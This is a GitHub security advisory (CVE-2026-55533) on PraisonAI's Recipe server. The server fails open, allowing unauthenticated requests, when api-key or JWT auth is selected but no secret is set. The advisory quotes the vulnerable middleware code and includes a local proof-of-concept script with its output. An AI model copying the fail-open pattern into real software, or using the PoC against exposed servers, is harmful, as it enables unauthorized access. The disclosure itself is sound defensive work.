# [H] PraisonAI: Authentication fail-open in Recipe server allows unauthenticated access when API key or JWT auth is configured without a secret

## Summary
Severity: High
Advisory: GHSA-gfq8-hmph-9gjv
CVE: CVE-2026-55533
CWE: CWE-287, CWE-306
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:N (CVSS_V3)
Published: 2026-08-25
Source: https://github.com/advisories/GHSA-gfq8-hmph-9gjv
Type: github-advisory

## Affected
- PyPI: `PraisonAI` — affected >=0 <4.6.58

## Details
### Summary

The PraisonAI Recipe HTTP server silently allows unauthenticated requests when `auth` is configured as `api-key` or `jwt` but the corresponding secret is missing.

This creates an authentication fail-open condition. An operator can start the Recipe server with authentication enabled, including on a non-localhost interface, but the server still accepts unauthenticated requests if no API key or JWT secret is provided.

The issue is especially risky because the CLI safety check for non-localhost binding only verifies that `auth != "none"`. It does not verify that an actual API key or JWT secret exists.

### Details

The Recipe server documents the following authentication modes:

- `none`
- `api-key`
- `jwt`

Relevant source locations:

- `src/praisonai/praisonai/recipe/serve.py`
- `src/praisonai/praisonai/cli/features/recipe.py`

In `create_auth_middleware()`, the API key middleware resolves the expected key as:

```python
expected_key = api_key or os.environ.get("PRAISONAI_API_KEY")

if not expected_key:
    # No key configured, allow request
    return await call_next(request)
```

This means `auth: api-key` does not enforce authentication if `api_key` / `PRAISONAI_API_KEY` is missing.

The JWT middleware has the same fail-open behavior:

```python
secret = jwt_secret or os.environ.get("PRAISONAI_JWT_SECRET")
if not secret:
    return await call_next(request)
```

The auth middleware is still attached when `auth` is configured:

```python
auth_type = config.get("auth")
if auth_type and auth_type != "none":
    auth_middleware = create_auth_middleware(
        auth_type,
        api_key=config.get("api_key"),
        jwt_secret=config.get("jwt_secret"),
    )
    if auth_middleware:
        middleware.append(Middleware(auth_middleware))
```

The CLI path makes this externally reachable in a misconfigured deployment. In `cmd_serve`, the non-localhost safety check only verifies that auth is not `"none"`:

```python
if host != "127.0.0.1" and host != "localhost" and auth == "none":
    self._print_error("Auth required for non-localhost binding. Use --auth api-key or --auth jwt")
    return self.EXIT_POLICY_DENIED
```

Therefore, this command passes the safety check:

```bash
praisonai recipe serve --host 0.0.0.0 --auth api-key
```

However, if no `--api-key` or `PRAISONAI_API_KEY` is configured, requests are still accepted without authentication.

Affected endpoints include:

- `POST /v1/recipes/run`
- `POST /v1/recipes/stream`
- `POST /v1/recipes/validate`
- optional `POST /admin/reload` when `enable_admin` is true

### PoC

The following local PoC verifies that `api-key` and `jwt` authentication fail open when the corresponding secret is missing.

Run from the repository root with test dependencies installed:

```bash
python3 poc_recipe_auth_fail_open.py
```

`poc_recipe_auth_fail_open.py`:

```python
import os
import sys
from pathlib import Path

from starlette.testclient import TestClient

ROOT = Path.cwd()
sys.path.insert(0, str(ROOT / "src" / "praisonai"))
sys.path.insert(0, str(ROOT / "src" / "praisonai-agents"))

# Ensure no secrets are present in the environment.
os.environ.pop("PRAISONAI_API_KEY", None)
os.environ.pop("PRAISONAI_JWT_SECRET", None)

from praisonai.recipe.serve import create_app

# api-key auth selected, but no key configured.
app_open = create_app({"auth": "api-key", "enable_admin": True})
client_open = TestClient(app_open)

print("api-key auth with missing key:")
print("GET /openapi.json:", client_open.get("/openapi.json").status_code)
print("POST /admin/reload:", client_open.post("/admin/reload").status_code)

# api-key auth selected with an actual key configured.
app_closed = create_app({
    "auth": "api-key",
    "api_key": "expected",
    "enable_admin": True,
})
client_closed = TestClient(app_closed)

print("\napi-key auth with configured key:")
print("missing key:", client_closed.post("/admin/reload").status_code)
print("wrong key:", client_closed.post(
    "/admin/reload",
    headers={"X-API-Key": "wrong"},
).status_code)
print("correct key:", client_closed.post(
    "/admin/reload",
    headers={"X-API-Key": "expected"},
).status_code)

# jwt auth selected, but no JWT secret configured.
app_jwt_open = create_app({"auth": "jwt"})
client_jwt_open = TestClient(app_jwt_open)

print("\njwt auth with missing secret:")
print("GET /openapi.json:", client_jwt_open.get("/openapi.json").status_code)
```

Observed output:

```text
api-key auth with missing key:
GET /openapi.json: 200
POST /admin/reload: 200

api-key auth with configured key:
missing key: 401
wrong key: 401
correct key: 200

jwt auth with missing secret:
GET /openapi.json: 200
```

The important result is that `auth=api-key` without a configured key allows requests to protected endpoints, while the same endpoint correctly returns `401` when a key is configured and missing/wrong.

### Impact

In an exposed deployment, an unauthenticated attacker can access Recipe server endpoints even though the operator selected `api-key` or `jwt` authentication.

This gives unauthenticated access to recipe execution endpoints such as:

- `POST /v1/recipes/run`
- `POST /v1/recipes/stream`

If admin endpoints are enabled, the attacker can also access:

- `POST /admin/reload`

The impact depends on the available recipes and deployment configuration. In the worst case, unauthenticated users can trigger recipe workflows or administrative reload operations on an externally bound Recipe server.

## References
- https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-gfq8-hmph-9gjv
- https://github.com/MervinPraison/PraisonAI/commit/2f9677abb2ea68eab864ee8b6a828fd0141612e1
- https://github.com/MervinPraison/PraisonAI
- https://github.com/MervinPraison/PraisonAI/releases/tag/v4.6.58
